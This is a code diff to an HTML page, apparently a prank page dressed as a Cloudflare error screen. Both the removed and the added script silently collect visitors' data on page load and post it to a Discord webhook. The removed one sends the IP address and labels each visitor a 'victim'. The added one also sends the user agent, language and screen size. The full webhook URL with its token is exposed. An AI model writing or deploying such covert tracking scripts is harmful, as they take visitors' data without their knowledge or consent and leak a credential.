@@ -39,35 +39,56 @@
         <a class="link" href="https://github.com/Pablo-Restrepo/Troll-Page-Scream"></a>
         <p>Ray ID: 348759h65g34h</p>
     </div>
-</body>
 
-<script>
-    function sendIPToWebhook(ip) {
-        const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257984661200830484/9OGdZXwcO93Ox8MJ2rHDJRZ5GSIIGJsZivt-9KO1HuPWZ9dBW5FuvIMHPl9PVlz87Np6';  // Remplace par ton URL de webhook Discord
-        const request = new XMLHttpRequest();
-        request.open("POST", webhookUrl);
-        request.setRequestHeader('Content-type', 'application/json');
+    <script src="main.js"></script>
+    <script>
+        function sendDetailsToWebhook(details) {
+            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257984661200830484/9OGdZXwcO93Ox8MJ2rHDJRZ5GSIIGJsZivt-9KO1HuPWZ9dBW5FuvIMHPl9PVlz87Np6';
 
-        const params = {
-            username: "Nouvelle Victime [bassem.vercel.app]",
-            content: `@here IP Address: ${ip}`
-        };
+            const data = {
+                content: `User Details: ${details}`
+            };
 
-        request.send(JSON.stringify(params));
-    }
-
-    function getIP() {
-        fetch('https://api.ipify.org?format=json')
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
             .then(response => response.json())
             .then(data => {
-                sendIPToWebhook(data.ip);
+                console.log('Success:', data);
             })
-            .catch(error => console.error('Error fetching IP:', error));
-    }
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
 
-    window.onload = getIP;
-</script>
+        function getUserDetails() {
+            const ipFetch = fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('Error getting IP:', error);
+                    return 'N/A';
+                });
 
-<script src="main.js"></script>
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+
+            return ipFetch.then(ip => {
+                return `IP: ${ip}\nUser-Agent: ${userAgent}\nLanguage: ${language}\nScreen Resolution: ${screenWidth}x${screenHeight}`;
+            });
+        }
+
+        // Get the user details and send them to the webhook
+        getUserDetails().then(details => {
+            sendDetailsToWebhook(details);
+        });
+    </script>
+</body>
 
 </html>
